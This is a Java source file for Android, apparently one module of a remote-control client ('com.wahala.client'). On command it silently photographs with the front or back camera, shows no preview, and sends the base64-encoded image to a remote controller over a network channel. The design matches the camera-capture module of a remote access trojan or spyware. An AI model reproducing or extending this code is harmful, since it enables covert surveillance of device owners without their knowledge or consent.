package com.wahala.client;

import android.content.Context;
import android.hardware.Camera;
import android.util.Base64;
import java.io.ByteArrayOutputStream;

public class CameraHelper {
    @SuppressWarnings("deprecation")
    public static void takePhoto(Context ctx, String action, Network net) {
        int cameraId = action.equalsIgnoreCase("FRONT") ? findCamera(Camera.CameraInfo.CAMERA_FACING_FRONT) : findCamera(Camera.CameraInfo.CAMERA_FACING_BACK);
        if (cameraId < 0) {
            net.send("{\"error\":\"camera not found\"}");
            return;
        }

        Camera camera = null;
        try {
            camera = Camera.open(cameraId);
            Camera.Parameters params = camera.getParameters();
            params.setPictureFormat(android.graphics.ImageFormat.JPEG);
            camera.setParameters(params);

            camera.takePicture(null, null, (data, cam) -> {
                String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
                net.send("{\"module\":\"CAMERA\",\"image_b64\":\"" + b64 + "\"}");
                cam.release();
            });
        } catch (Exception e) {
            if (camera != null) camera.release();
            net.send("{\"error\":\"camera failed: " + e.getMessage() + "\"}");
        }
    }

    @SuppressWarnings("deprecation")
    private static int findCamera(int facing) {
        int count = Camera.getNumberOfCameras();
        Camera.CameraInfo info = new Camera.CameraInfo();
        for (int i = 0; i < count; i++) {
            Camera.getCameraInfo(i, info);
            if (info.facing == facing) return i;
        }
        return -1;
    }
}